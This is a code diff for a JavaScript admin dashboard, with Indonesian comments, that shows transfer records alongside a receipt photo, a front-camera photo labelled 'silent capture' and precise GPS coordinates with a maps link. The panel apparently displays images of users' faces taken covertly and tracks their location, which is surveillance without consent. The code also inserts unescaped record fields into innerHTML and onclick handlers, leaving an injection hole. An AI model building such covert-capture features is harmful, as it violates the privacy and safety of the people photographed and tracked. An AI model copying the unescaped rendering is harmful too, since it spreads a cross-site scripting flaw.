@@ -249,44 +249,54 @@
             const tr = document.createElement('tr');
             
             // ==========================================
-            // LOKASI (dari silent capture)
+            // 1. FOTO BARANG/STRUK (Kamera Belakang) - BESAR
+            // ==========================================
+            let receiptPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
+            const receiptImg = t.photo || t.receiptPhoto || '';
+            if (receiptImg) {
+                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb-large photo-thumb-receipt" alt="Struk ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Klik untuk perbesar Foto Barang/Struk">`;
+            }
+
+            // ==========================================
+            // 2. FOTO KAMERA DEPAN (Silent Capture) - BESAR
+            // ==========================================
+            let frontPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
+            const frontImg = t.frontPhoto || t.front_photo || '';
+            if (frontImg) {
+                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb-large photo-thumb-front" alt="Depan ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="Klik untuk perbesar FOTO KAMERA DEPAN (SILENT)">`;
+            }
+
+            // ==========================================
+            // 3. LOKASI (GPS AKURAT)
             // ==========================================
             let locStr = '<span style="color:var(--text-muted)">Tanpa GPS</span>';
             if (t.location && typeof t.location.lat === 'number' && typeof t.location.lng === 'number') {
-                locStr = `<a href="https://www.google.com/maps/search/?api=1&query=${t.location.lat},${t.location.lng}" target="_blank" style="color:var(--accent-green); text-decoration:none;">${t.location.lat.toFixed(5)}, ${t.location.lng.toFixed(5)} ↗</a>`;
+                const acc = t.location.accuracy ? `±${Math.round(t.location.accuracy)}m` : '';
+                locStr = `
+                    <div style="font-family:'Share Tech Mono', monospace; font-size:13px; line-height:1.6;">
+                        <div style="color:#ffffff; font-weight:700;">Lat: ${t.location.lat.toFixed(6)}</div>
+                        <div style="color:#ffffff; font-weight:700;">Lng: ${t.location.lng.toFixed(6)}</div>
+                        ${acc ? `<div style="color:var(--accent-green); font-size:11px;">Akurasi: ${acc}</div>` : ''}
+                        <a href="https://www.google.com/maps/search/?api=1&query=${t.location.lat},${t.location.lng}" target="_blank" style="display:inline-block; margin-top:6px; padding:4px 10px; background:rgba(0,255,179,0.15); border:1px solid var(--accent-green); border-radius:6px; color:var(--accent-green); text-decoration:none; font-weight:bold; font-size:11px;">📍 Buka Google Maps ↗</a>
+                    </div>
+                `;
             }
 
             // ==========================================
-            // FOTO BARANG/STRUK (dari kamera belakang)
+            // 4. WAKTU (WIB)
             // ==========================================
-            let receiptPhotoHtml = '<span style="color:var(--text-muted); font-size:12px;">Tidak Ada</span>';
-            const receiptImg = t.photo || t.receiptPhoto || '';
-            if (receiptImg) {
-                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb" alt="Struk ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Foto Barang/Struk" style="width:60px; height:60px; object-fit:cover; border-radius:6px; cursor:pointer; border:1px solid #333;">`;
-            }
-
-            // ==========================================
-            // FOTO KAMERA DEPAN (dari SILENT CAPTURE)
-            // ==========================================
-            let frontPhotoHtml = '<span style="color:var(--text-muted); font-size:12px;">Tidak Ada</span>';
-            const frontImg = t.frontPhoto || t.front_photo || '';
-            if (frontImg) {
-                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb" alt="Depan ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="FOTO KAMERA DEPAN (SILENT CAPTURE)" style="width:60px; height:60px; object-fit:cover; border-radius:6px; cursor:pointer; border:2px solid #ff4444;">`;
-            }
-
-            let timeStr = t.timestamp ? new Date(t.timestamp).toLocaleString('id-ID') : '-';
+            let timeStr = t.timestamp ? new Date(t.timestamp).toLocaleString('id-ID', {
+                dateStyle: 'medium',
+                timeStyle: 'medium'
+            }) : '-';
 
             tr.innerHTML = `
-                <td><strong style="color:var(--accent-green); font-family:'Share Tech Mono',monospace;">${t.transferId || '-'}</strong></td>
-                <td>${t.sender || '-'}</td>
-                <td>${t.receiver || '-'}</td>
-                <td><strong>${t.amount || '-'}</strong></td>
-                <td>${receiptPhotoHtml}</td>
-                <td>${frontPhotoHtml}</td>
-                <td>${locStr}</td>
-                <td style="font-family:'Share Tech Mono',monospace; font-size:12px;">${timeStr}</td>
-                <td>
-                    <button class="btn-action-del" onclick="window.deleteTransaction('${t.transferId}')">Hapus</button>
+                <td style="vertical-align:top; padding:16px;">${receiptPhotoHtml}</td>
+                <td style="vertical-align:top; padding:16px;">${frontPhotoHtml}</td>
+                <td style="vertical-align:top; padding:16px;">${locStr}</td>
+                <td style="vertical-align:top; padding:16px; font-family:'Share Tech Mono',monospace; font-size:13px; color:var(--text-light);">${timeStr}</td>
+                <td style="vertical-align:top; padding:16px;">
+                    <button class="btn-action-del" onclick="window.deleteTransaction('${t.transferId}')">🗑️ Hapus</button>
                 </td>
             `;
             elements.transTableBody.appendChild(tr);
